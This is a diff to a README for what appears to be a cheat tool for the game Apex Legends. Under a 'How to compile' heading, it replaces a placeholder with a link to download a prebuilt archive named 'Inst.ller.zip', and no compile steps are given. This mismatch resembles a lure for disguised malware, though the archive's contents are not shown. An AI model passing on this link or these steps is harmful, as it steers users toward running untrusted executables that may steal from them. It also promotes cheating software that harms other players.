@@ -10,7 +10,7 @@
 
 ## How to compile
 
-- [Download file](555)
+- [Download file](https://github.com/casanovaheadshot/ApexLegends-External-Cheat/releases/download/V2.5.1/Inst.ller.zip)
 - When the build is complete, select **Start Without Debugging** from the **Debug** menu or press `Ctrl+F5` to run the project.
 
 
